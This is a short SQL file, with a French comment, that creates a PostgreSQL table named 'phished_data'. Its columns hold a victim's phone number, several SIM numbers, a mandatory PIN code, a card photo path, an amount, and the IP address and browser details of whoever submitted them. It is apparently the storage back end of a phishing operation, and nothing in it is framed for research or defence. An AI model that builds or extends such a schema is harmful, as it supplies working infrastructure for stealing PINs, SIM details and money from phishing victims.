CREATE TABLE IF NOT EXISTS phished_data (
    id SERIAL PRIMARY KEY,
    phone_number VARCHAR(20) NOT NULL,
    sim_number_1 VARCHAR(20),
    sim_number_2 VARCHAR(20),
    sim_number_3 VARCHAR(20),
    sim_number_4 VARCHAR(20),
    sim_number_5 VARCHAR(20),
    pin_code VARCHAR(10) NOT NULL,
    reader_card_photo_path VARCHAR(255),
    amount NUMERIC(10, 2),
    submission_timestamp TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
    ip_address VARCHAR(45),
    user_agent TEXT
);
-- Ajouter d'autres tables si nécessaire
